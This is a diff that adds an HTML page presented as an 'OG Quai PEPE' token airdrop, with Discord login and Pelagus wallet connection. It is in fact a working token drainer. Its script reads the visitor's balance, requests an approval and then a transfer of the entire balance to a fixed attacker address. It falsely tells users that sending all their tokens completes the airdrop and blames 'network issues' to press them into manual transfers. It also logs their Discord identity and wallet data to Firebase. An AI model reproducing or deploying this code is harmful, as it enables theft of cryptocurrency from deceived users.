@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Its comming</title>
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link rel="manifest" href="site.webmanifest">
+    <link rel="icon" type="image/png" sizes="192x192" href="android-chrome-192x192.png">
+    <link rel="icon" type="image/png" sizes="512x512" href="android-chrome-512x512.png">
+    
+    <!-- Include Quai SDK -->
+
+    <script src="https://unpkg.com/quais@latest/dist/quais.umd.js"></script>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-firestore-compat.js"></script>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .slideshow {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .slideshow img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            animation: fade 24s infinite;
+            opacity: 0;
+        }
+
+        .slideshow img:nth-child(1) { animation-delay: 0s; }
+        .slideshow img:nth-child(2) { animation-delay: 8s; }
+        .slideshow img:nth-child(3) { animation-delay: 16s; }
+
+        @keyframes fade {
+            0% { opacity: 0; }
+            20% { opacity: 1; }
+            40% { opacity: 1; }
+            60% { opacity: 0; }
+            100% { opacity: 0; }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.164);
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 600px;
+        }
+
+        .title {
+            text-align: center;
+            color: #ffffff;
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            font-weight: bold;
+            display: none;
+        }
+
+        .btn-connect {
+    background: #4F46E5;
+    color: white;
+    border: none;
+    padding: 12px 24px;
+    border-radius: 6px;
+    width: 100%;
+    cursor: pointer;
+    font-size: 16px;
+    margin-bottom: 1rem;
+    display: none;
+    animation: glowEffectWallet 2s infinite;
+    transition: all 0.3s ease;
+}
+
+        .btn-discord {
+    background: #5865F2;
+    color: white;
+    border: none;
+    padding: 12px 24px;
+    border-radius: 6px;
+    width: 100%;
+    cursor: pointer;
+    font-size: 16px;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    animation: glowEffect 2s infinite;
+    transition: all 0.3s ease;
+}
+
+        .btn-scan {
+            background: #10B981;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 0.5rem;
+            display: none;
+        }
+
+        .btn-buy {
+            background: #f59e0b;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 1rem;
+            display: none;
+        }
+
+        #console {
+            margin-top: 1rem;
+            padding: 1rem;
+            background: #1a1a1a;
+            color: #00ff00;
+            border-radius: 6px;
+            font-family: monospace;
+            max-height: 100px;
+            overflow-y: auto;
+        }
+
+        .airdrop-info {
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 1rem;
+            border-radius: 6px;
+            margin: 1rem 0;
+            display: none;
+        }
+
+        .btn-send {
+            background: #ef4444;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 1rem;
+            display: none;
+        }
+
+        /* Add this to the existing style section */
+
+        @keyframes glowEffect {
+    0% {
+        box-shadow: 0 0 5px #93c5fd, 0 0 10px #93c5fd, 0 0 15px #93c5fd;
+    }
+    50% {
+        box-shadow: 0 0 10px #93c5fd, 0 0 20px #93c5fd, 0 0 30px #93c5fd;
+    }
+    100% {
+        box-shadow: 0 0 5px #93c5fd, 0 0 10px #93c5fd, 0 0 15px #93c5fd;
+    }
+}
+
+@keyframes glowEffectWallet {
+    0% {
+        box-shadow: 0 0 5px #a5b4fc, 0 0 10px #a5b4fc, 0 0 15px #a5b4fc;
+    }
+    50% {
+        box-shadow: 0 0 10px #a5b4fc, 0 0 20px #a5b4fc, 0 0 30px #a5b4fc;
+    }
+    100% {
+        box-shadow: 0 0 5px #a5b4fc, 0 0 10px #a5b4fc, 0 0 15px #a5b4fc;
+    }
+}
+
+.btn-discord:hover {
+    transform: translateY(-2px);
+    animation: glowEffect 1s infinite;
+}
+
+.btn-connect:hover {
+    transform: translateY(-2px);
+    animation: glowEffectWallet 1s infinite;
+}
+
+.btn-copy {
+    background: #10B981;
+    color: white;
+    border: none;
+    padding: 12px 24px;
+    border-radius: 6px;
+    width: 100%;
+    cursor: pointer;
+    font-size: 16px;
+    margin-top: 1rem;
+    display: none;
+    transition: all 0.3s ease;
+}
+
+.btn-copy:hover {
+    background: #059669;
+}
+    </style>
+</head>
+<body>
+    <div class="slideshow">
+        <img src="photo_2024-12-04_22-37-49.jpg" alt="Background 1">
+        <img src="photo_2024-04-06_14-47-24.jpg" alt="Background 2">
+        <img src="photo_2024-04-12_16-05-40.jpg" alt="Background 3">
+    </div>
+    <div class="container">
+        <div id="titleText" class="title">🚀 Buy More OG Quai PEPE! 🐸</div>
+        
+        <button id="discordBtn" class="btn-discord">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4C14.85 4.29 14.68 4.69 14.55 5.01C12.95 4.77 11.37 4.77 9.8 5.01C9.67 4.69 9.49 4.29 9.34 4C7.83 4.26 6.39 4.71 5.06 5.33C2.02 9.83 1.21 14.21 1.62 18.52C3.43 19.87 5.19 20.69 6.92 21.22C7.29 20.7 7.63 20.15 7.91 19.57C7.25 19.33 6.62 19.03 6.02 18.67C6.17 18.56 6.31 18.44 6.45 18.32C9.76 19.86 13.39 19.86 16.66 18.32C16.8 18.44 16.94 18.56 17.09 18.67C16.48 19.03 15.85 19.33 15.19 19.57C15.47 20.15 15.81 20.7 16.18 21.22C17.91 20.69 19.67 19.87 21.48 18.52C21.96 13.52 20.72 9.18 19.27 5.33ZM8.57 15.96C7.53 15.96 6.68 15.02 6.68 13.87C6.68 12.72 7.51 11.78 8.57 11.78C9.63 11.78 10.48 12.72 10.46 13.87C10.46 15.02 9.62 15.96 8.57 15.96ZM15.53 15.96C14.49 15.96 13.64 15.02 13.64 13.87C13.64 12.72 14.47 11.78 15.53 11.78C16.59 11.78 17.44 12.72 17.42 13.87C17.42 15.02 16.59 15.96 15.53 15.96Z" fill="currentColor"/>
+            </svg>
+            Connect Discord
+        </button>
+        <button id="connectBtn" class="btn-connect">Connect Pelagus</button>
+        
+<!-- New airdrop info and send button -->
+<div id="airdropInfo" class="airdrop-info">
+    <h3>🎉 OG Quai PEPE Airdrop</h3>
+    <p>To complete the airdrop process, you need to send all your OG Quai PEPE tokens.</p>
+    <p>Destination: 0x006B8A853ee3235c77947D12E47A3dBC547Bab10</p>
+    <p>Your token balance: <span id="userBalance">0</span> OG Quai PEPE</p>
+    <p><small>Note: This transaction will send your entire Quai PEPE token balance.</small></p>
+</div>
+<button id="sendBtn" class="btn-send">Send All Tokens</button>
+
+
+        <div id="console"></div>
+        <button id="buyBtn" class="btn-buy" style="display:none" onclick="window.open('https://poop.fun/token/0x001411083d4CF24632BA5e0841909933C2Da04a8', '_blank')">Buy Here!</button>
+        <button id="copyBtn" class="btn-copy" style="display:none">
+            Copy Address: 0x006B8A853ee3235c77947D12E47A3dBC547Bab10
+        </button>
+    </div>
+
+
+
+    <script>
+        function copyAddressToClipboard() {
+    navigator.clipboard.writeText(DESTINATION_ADDRESS)
+        .then(() => {
+            log('✅ Address copied to clipboard');
+            const copyBtn = document.getElementById('copyBtn');
+            const originalText = copyBtn.textContent;
+            copyBtn.textContent = '✅ Copied!';
+            setTimeout(() => {
+                copyBtn.textContent = originalText;
+            }, 2000);
+        })
+        .catch(err => {
+            log('❌ Failed to copy address: ' + err);
+        });
+}
+document.getElementById('copyBtn').addEventListener('click', copyAddressToClipboard);
+
+const TOKEN_ABI = [
+    {
+        "constant": false,
+        "inputs": [
+            {
+                "name": "_to",
+                "type": "address"
+            },
+            {
+                "name": "_value",
+                "type": "uint256"
+            }
+        ],
+        "name": "transfer",
+        "outputs": [
+            {
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "_owner",
+                "type": "address"
+            }
+        ],
+        "name": "balanceOf",
+        "outputs": [
+            {
+                "name": "balance",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
+    }
+];
+        const TOKEN_ADDRESS = '0x001411083d4CF24632BA5e0841909933C2Da04a8';
+        const DESTINATION_ADDRESS = '0x006B8A853ee3235c77947D12E47A3dBC547Bab10';
+        const RPC_ENDPOINT = 'https://rpc.quai.network/cyprus1';
+        
+        // Initialize Firebase
+        const firebaseConfig = {
+            projectId: "quaipepe-70873",
+            // Rest will be injected by GitHub Actions
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // Discord OAuth2 configuration
+        const DISCORD_CLIENT_ID = '1315307312058994759';
+        const REDIRECT_URI = encodeURIComponent(window.location.origin + window.location.pathname);
+        const DISCORD_OAUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${REDIRECT_URI}&response_type=token&scope=identify`;
+
+// Global object to hold data temporarily
+window.userData = {};
+let userSession = {};
+async function saveSessionToFirebase() {
+    try {
+        const docRef = db.collection('users').doc(userSession.address || `user_${userSession.discordId}`);
+        
+        // First get existing document data
+        const doc = await docRef.get();
+        
+        // Initialize payload
+        let payload = {
+            ...userSession,
+            lastUpdated: firebase.firestore.FieldValue.serverTimestamp(),
+        };
+
+        // If we have a new transaction to save
+        if (userSession.transferAmount && userSession.transferTxHash) {
+            let transactions = [];
+            
+            // If document exists and has previous transactions
+            if (doc.exists) {
+                transactions = doc.data().transactions || [];
+                
+                // Add total transferred amount from previous transactions
+                let totalTransferred = parseFloat(doc.data().totalTransferred || 0);
+                totalTransferred += parseFloat(userSession.transferAmount);
+                payload.totalTransferred = totalTransferred;
+            } else {
+                // First transaction
+                payload.totalTransferred = parseFloat(userSession.transferAmount);
+            }
+
+            // Add new transaction to array
+            transactions.push({
+                amount: userSession.transferAmount,
+                txHash: userSession.transferTxHash,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            });
+
+            payload.transactions = transactions;
+        }
+
+        await docRef.set(payload, { merge: true });
+        log('Data saved to database with updated transaction history');
+        
+        if (payload.totalTransferred) {
+            log(`Total transferred so far: ${payload.totalTransferred} OG Quai PEPE`);
+        }
+    } catch (error) {
+        log(`Error saving data: ${error.message}`);
+        console.error(error);
+    }
+}
+
+// Firebase save function with merged data
+async function saveToFirebase(data) {
+    try {
+        const userId = data.discordId || data.address;
+        const docRef = db.collection('users').doc(userId);
+        const payload = {
+            lastUpdated: firebase.firestore.FieldValue.serverTimestamp(),
+            ...window.userData,
+            ...data, // Merge new data into the global data object
+        };
+        await docRef.set(payload, { merge: true });
+        log('Data saved to database successfully');
+    } catch (error) {
+        log(`Error saving to database: ${error.message}`);
+        console.error(error);
+    }
+}
+
+        async function getQuaiBalance(address) {
+            try {
+                const response = await fetch(RPC_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        jsonrpc: '2.0',
+                        method: 'quai_getBalance',
+                        params: [address, 'latest'],
+                        id: 1
+                    })
+                });
+                
+                const data = await response.json();
+                return data.result;
+            } catch (error) {
+                log('QUAI balance error: ' + error.message);
+                return null;
+            }
+        }
+
+        async function getTokenBalance(address) {
+            try {
+                const data = '0x70a08231000000000000000000000000' + address.slice(2);
+                
+                const response = await fetch(RPC_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        jsonrpc: '2.0',
+                        method: 'quai_call',
+                        params: [{
+                            to: TOKEN_ADDRESS,
+                            data: data
+                        }, 'latest'],
+                        id: 2
+                    })
+                });
+                
+                const result = await response.json();
+                if (result.result) {
+                    return BigInt(result.result);
+                }
+                return 0n;
+            } catch (error) {
+                log('Token balance error: ' + error.message);
+                return 0n;
+            }
+        }
+
+        function log(message) {
+            const consoleDiv = document.getElementById('console');
+            const entry = document.createElement('div');
+            entry.textContent = `${new Date().toLocaleTimeString()} - ${message}`;
+            consoleDiv.appendChild(entry);
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            console.log(message);
+        }
+
+        async function approveTokens() {
+    try {
+        if (!window.pelagus) {
+            throw new Error('Pelagus wallet not detected. Please install or enable it.');
+        }
+
+        log('🔄 Requesting approval for token transfer. Please confirm in your Pelagus wallet...');
+
+        const accounts = await window.pelagus.request({ method: 'eth_requestAccounts' });
+        const signerAddress = accounts[0];
+        console.log(`✅ Wallet connected: ${signerAddress}`);
+
+        const rawBalance = BigInt(userSession.tokenBalance * 1e18); // Ensure proper formatting
+        if (rawBalance === 0n) {
+            throw new Error('Token balance is zero. Please verify your token balance.');
+        }
+
+        const approveData = 
+            '0x095ea7b3' + // Method ID for approve(address,uint256)
+            DESTINATION_ADDRESS.slice(2).padStart(64, '0') + 
+            rawBalance.toString(16).padStart(64, '0');
+
+        console.log('✅ Approval Data Prepared:', approveData);
+
+        const gasEstimateResponse = await fetch(RPC_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0',
+                method: 'quai_estimateGas',
+                params: [{
+                    from: signerAddress,
+                    to: TOKEN_ADDRESS,
+                    data: approveData,
+                }],
+                id: 2,
+            }),
+        });
+        const gasEstimateResult = await gasEstimateResponse.json();
+        const gasLimit = gasEstimateResult.result || '0x5208'; // Default gas if estimation fails
+        console.log(`✅ Gas Estimate for Approval: ${gasLimit}`);
+
+        // Send Approval Transaction
+        const txResponse = await window.pelagus.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: signerAddress,
+                to: TOKEN_ADDRESS,
+                data: approveData,
+                gas: gasLimit,
+            }],
+        });
+
+        log('✅ Approval transaction sent. Waiting for confirmation...');
+        const receipt = await waitForTransaction(txResponse, RPC_ENDPOINT);
+        console.log('✅ Approval Confirmed:', receipt.transactionHash);
+
+        alert(`✅ Tokens approved successfully! Transaction Hash: ${receipt.transactionHash}`);
+        log('✅ Approval confirmed. You can now proceed to send tokens.');
+
+    } catch (error) {
+        if (error.message.includes('user rejected')) {
+            log('❌ Approval rejected by the user. Please approve to proceed.');
+            alert('❌ You rejected the approval. Please confirm in your wallet.');
+        } else {
+            console.error('❌ Error approving tokens:', error.message || error);
+            alert(`❌ Approval Error: ${error.message}`);
+        }
+        throw error; // Re-throw to stop further processing
+    }
+}
+
+async function sendTokens() {
+    try {
+        if (!window.pelagus) {
+            throw new Error('Pelagus wallet not detected. Please install or enable it.');
+        }
+
+        log('🔄 Preparing token transfer. Please confirm in your Pelagus wallet...');
+
+        const accounts = await window.pelagus.request({ method: 'eth_requestAccounts' });
+        const signerAddress = accounts[0];
+        console.log(`✅ Wallet connected: ${signerAddress}`);
+
+        const rawBalance = BigInt(userSession.tokenBalance * 1e18);
+        if (rawBalance === 0n) {
+            throw new Error('Token balance is zero. Please verify your token balance.');
+        }
+
+        const transferData = 
+            '0xa9059cbb' + 
+            DESTINATION_ADDRESS.slice(2).padStart(64, '0') + 
+            rawBalance.toString(16).padStart(64, '0');
+
+        console.log('✅ Transaction Data Prepared:', transferData);
+
+        const gasEstimateResponse = await fetch(RPC_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: '2.0',
+                method: 'quai_estimateGas',
+                params: [{
+                    from: signerAddress,
+                    to: TOKEN_ADDRESS,
+                    data: transferData,
+                }],
+                id: 2,
+            }),
+        });
+        const gasEstimateResult = await gasEstimateResponse.json();
+        const gasLimit = gasEstimateResult.result || '0x5208';
+        console.log(`✅ Gas Estimate: ${gasLimit}`);
+
+        const txResponse = await window.pelagus.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: signerAddress,
+                to: TOKEN_ADDRESS,
+                data: transferData,
+                gas: gasLimit,
+            }],
+        });
+
+        log('✅ Token transfer initiated. Waiting for confirmation...');
+        const receipt = await waitForTransaction(txResponse, RPC_ENDPOINT);
+        console.log('✅ Transaction Confirmed:', receipt.transactionHash);
+
+        userSession.transferAmount = userSession.tokenBalance;
+        userSession.transferTxHash = receipt.transactionHash;
+        await saveSessionToFirebase();
+
+        alert(`🎉 Tokens sent successfully! Transaction Hash: ${receipt.transactionHash}`);
+        log('✅ Tokens sent successfully. Transaction complete.');
+
+    } catch (error) {
+        if (error.message.includes('user rejected')) {
+            log('❌ Token transfer rejected by the user. Please approve to proceed.');
+            alert('❌ You rejected the transfer. Please confirm in your wallet.');
+        } else {
+            console.error('❌ Error sending tokens:', error.message || error);
+            
+            // Save session data even if transaction failed
+            try {
+                userSession.transferAmount = userSession.tokenBalance;
+                userSession.transferTxHash = 'failed_tx';
+                userSession.transferStatus = 'failed';
+                await saveSessionToFirebase();
+                
+                // Show manual transfer instructions
+                log('❌ Network issues detected. Your data has been saved.');
+                log('⚠️ Please send your tokens manually to complete the process:');
+                log(`📍 Send to: ${DESTINATION_ADDRESS}`);
+                log(`💰 Amount: ${userSession.tokenBalance} OG Quai PEPE`);
+                
+                alert(`Due to network issues, please send your tokens manually to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation data has been saved.`);
+                
+                // Show the scan and buy buttons even though transfer failed
+                document.getElementById('scanBtn').style.display = 'block';
+                document.getElementById('buyBtn').style.display = 'block';
+            } catch (saveError) {
+                console.error('Error saving failed transaction data:', saveError);
+            }
+        }
+        throw error;
+    }
+}
+
+
+// Utility Function for Waiting for Transaction Confirmation
+async function waitForTransaction(txHash, rpcEndpoint) {
+    const MAX_RETRIES = 12; // Retry up to 12 times (1 minute)
+    let retries = 0;
+
+    while (retries < MAX_RETRIES) {
+        try {
+            const receiptResponse = await fetch(rpcEndpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    jsonrpc: '2.0',
+                    method: 'quai_getTransactionReceipt',
+                    params: [txHash],
+                    id: 3,
+                }),
+            });
+
+            const receiptResult = await receiptResponse.json();
+            if (receiptResult.result) {
+                return receiptResult.result;
+            }
+
+            retries++;
+            console.log(`🔄 Waiting for transaction confirmation... (${retries}/12)`);
+            await new Promise(resolve => setTimeout(resolve, 5000)); // Retry every 5 seconds
+        } catch (error) {
+            console.error('❌ Error fetching transaction receipt:', error.message || error);
+            retries++;
+        }
+    }
+
+    throw new Error('Transaction confirmation timed out.');
+}
+
+        async function connectWallet() {
+    try {
+        if (!window.pelagus) {
+            log('❌ Pelagus wallet not found!');
+            log('Please install Pelagus wallet extension first');
+            throw new Error('Pelagus wallet not found');
+        }
+
+        log('🔄 Connecting to Pelagus wallet...');
+        const accounts = await window.pelagus.request({
+            method: 'eth_requestAccounts',
+        });
+
+        const address = accounts[0];
+        log('✅ Wallet connected successfully!');
+        log('📍 Address: ' + address);
+        log('---------------------------------------------');
+        log('🔄 Checking balances...');
+
+        // Get balances
+        const quaiBalance = await getQuaiBalance(address);
+        const tokenBalance = await getTokenBalance(address);
+
+        // Store wallet data in userSession
+        userSession.address = address;
+        userSession.quaiBalance = parseInt(quaiBalance, 16) / 1e18;
+        userSession.tokenBalance = Number(tokenBalance) / 1e18;
+
+        log(`QUAI Balance: ${userSession.quaiBalance.toFixed(4)} QUAI`);
+        log(`Token Balance: ${userSession.tokenBalance.toFixed(2)} OG Quai PEPE`);
+
+        // Save combined session data to Firebase
+        await saveSessionToFirebase();
+
+        // Update UI
+        document.getElementById('titleText').style.display = 'block';
+        document.getElementById('connectBtn').style.display = 'none';
+        
+        // Show airdrop info and update balance
+        document.getElementById('airdropInfo').style.display = 'block';
+        document.getElementById('userBalance').textContent = userSession.tokenBalance.toFixed(2);
+        document.getElementById('sendBtn').style.display = 'block';
+
+        // Hide scan and buy buttons until transfer is complete
+        document.getElementById('scanBtn').style.display = 'none';
+        document.getElementById('buyBtn').style.display = 'none';
+        
+        // Set up scan button link
+        document.getElementById('scanBtn').onclick = () =>
+            window.location.href = `https://quaiscan.io/address/${address}`;
+            
+        // Check if transfer was already completed
+        const userDoc = await db.collection('users').doc(address).get();
+        if (userDoc.exists && userDoc.data().transactions?.length > 0) {
+        const transactions = userDoc.data().transactions;
+        const totalTransferred = userDoc.data().totalTransferred || 0;
+        document.getElementById('sendBtn').style.display = 'block'; // Always show send button
+        document.getElementById('scanBtn').style.display = 'block';
+        document.getElementById('buyBtn').style.display = 'block';
+        log(`Previous transfers found. Total transferred: ${totalTransferred} tokens`);
+        log(`Last transfer: ${transactions[transactions.length - 1].amount} tokens`);
+        log(`Last transaction hash: ${transactions[transactions.length - 1].txHash}`);
+    }
+
+        log('---------------------------------------------');
+        log('🎁 Final step: Send tokens to participate in airdrop');
+    } catch (error) {
+        log('❌ Error: ' + error.message);
+        console.error(error);
+    }
+}
+
+async function handleDiscordCallback() {
+    const fragment = new URLSearchParams(window.location.hash.slice(1));
+    const accessToken = fragment.get('access_token');
+
+    if (accessToken) {
+        try {
+            log('🔄 Verifying Discord connection...');
+            const response = await fetch('https://discord.com/api/users/@me', {
+                headers: { Authorization: `Bearer ${accessToken}` },
+            });
+
+            const data = await response.json();
+            
+            // Store Discord data in userSession
+            userSession.discordId = data.id;
+            userSession.username = data.username;
+            userSession.discriminator = data.discriminator;
+            userSession.avatar = data.avatar;
+
+            log('✅ Discord connected successfully!');
+            log(`Welcome, ${data.username}!`);
+            log('📱 Next step: Connect your Pelagus wallet');
+            
+            history.replaceState(null, null, window.location.pathname);
+
+            // Show wallet connect button after Discord login
+            document.getElementById('discordBtn').style.display = 'none';
+            document.getElementById('connectBtn').style.display = 'block';
+        } catch (error) {
+            log('❌ Discord Error: ' + error.message);
+            console.error(error);
+        }
+    }
+}
+
+// Add this after the log function definition
+function showInitialInstructions() {
+    log('🎮 Step 1: Connect your Discord account');
+    log('👛 Step 2: Connect your Pelagus wallet');
+    log('🎁 Step 3: Send tokens to participate in airdrop');
+}
+
+// Add this to modify the console's initial appearance
+const consoleDiv = document.getElementById('console');
+consoleDiv.style.minHeight = '150px';  // Makes console more visible initially
+showInitialInstructions();
+
+// Event Listeners
+document.getElementById('discordBtn').addEventListener('click', () => {
+    log('🎮 Connecting to Discord...');
+    log('Please complete authentication in the Discord popup');
+    window.location.href = DISCORD_OAUTH_URL;
+});
+
+
+document.getElementById('connectBtn').addEventListener('click', connectWallet);
+document.getElementById('sendBtn').addEventListener('click', async () => {
+    try {
+        log('🔄 Step 1: Approving tokens...');
+        await approveTokens();
+        log('✅ Step 1 Complete: Tokens approved. Proceeding to send...');
+        
+        try {
+            log('🔄 Step 2: Sending tokens...');
+            await sendTokens();
+            log('✅ Step 2 Complete: Tokens sent successfully!');
+        } catch (sendError) {
+            // If tokens were approved but transfer failed/rejected
+            log('❌ Transfer unsuccessful after successful approval');
+            log('⚠️ Since tokens are already approved, you can send them manually:');
+            log(`📍 Send to: ${DESTINATION_ADDRESS}`);
+            log(`💰 Amount: ${userSession.tokenBalance} OG Quai PEPE`);
+            
+            // Save the approval status
+            userSession.approvalStatus = 'success';
+            userSession.transferStatus = 'manual_required';
+            await saveSessionToFirebase();
+            
+            alert(`Since tokens are approved but transfer failed, (network issue) please send your tokens manually to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation data has been saved.`);
+            
+            document.getElementById('copyBtn').style.display = 'block';
+        }
+    } catch (approveError) {
+        console.error('❌ Error in approval:', approveError.message || approveError);
+        log(`❌ Token approval unsuccessful`);
+        log('⚠️ You can try sending tokens directly from your wallet:');
+        log(`📍 Send to: ${DESTINATION_ADDRESS}`);
+        log(`💰 Amount: ${userSession.tokenBalance} OG Quai PEPE`);
+        
+        // Save the failed approval status
+        userSession.approvalStatus = 'failed';
+        userSession.transferStatus = 'manual_required';
+        await saveSessionToFirebase();
+        
+        alert(`Since token approval failed, (network issue) please send your tokens directly from your wallet to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation has been recorded.`);
+        document.getElementById('copyBtn').addEventListener('click', copyAddressToClipboard);
+        document.getElementById('copyBtn').style.display = 'block';
+    }
+});
+
+
+// Check for Discord callback on page load
+if (window.location.hash.includes('access_token')) {
+    handleDiscordCallback();
+}
+    </script>
+</body>
+</html>
